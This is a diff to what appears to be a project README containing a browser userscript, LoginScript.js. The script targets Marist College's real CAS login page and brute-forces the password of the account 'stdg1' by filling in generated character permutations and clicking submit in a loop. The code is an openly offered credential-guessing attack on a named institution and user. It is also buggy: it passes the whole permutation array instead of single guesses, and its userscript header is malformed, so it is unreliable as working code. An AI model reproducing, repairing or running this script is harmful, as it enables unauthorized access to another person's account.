@@ -13,27 +13,32 @@ When loging onto marist services, the user is presented with a log on page worki
 **LoginScript.js**
 
 ```javascript
-// ==UserScript==
+// ==/UserScript==
 if (window.location == 'https://login.marist.edu/cas/login') {
     if(!document.getElementById('password').value){
         alert("Starting");
         var charset = "abcdefghijklmnopqrstuvwxyz0123456789";
-        // permutations = permut(charset);
+        permutations = permut(charset);
         for (var permutation of permutations){
-            //Place password attempt in password textbox
-            username = "stdg1";
-            document.getElementById('username').value = username;
-            document.getElementById('password').value = permutations;
-            //Press the submit button
-             document.getElementsByName('submit')[0].click();
-        }
+            testPW(permutations);
+        }  
     }
+}
+
+function testPW(string){
+    //Place password attempt in password textbox
+    username = "stdg1";
+    document.getElementById('username').value = username;
+    document.getElementById('password').value = permutations;
+    //Press the submit button
+    document.getElementsByName('submit')[0].click();
 }
 
 //Heaps Algorithm
 function permut(string) {
     if (string.length < 2) return string; //break condition
     var permutations = []; //array to hold permutations
+
     for (var i=0; i<string.length; i++) {
         var char = string[i];
         // Eliminate duplicates:
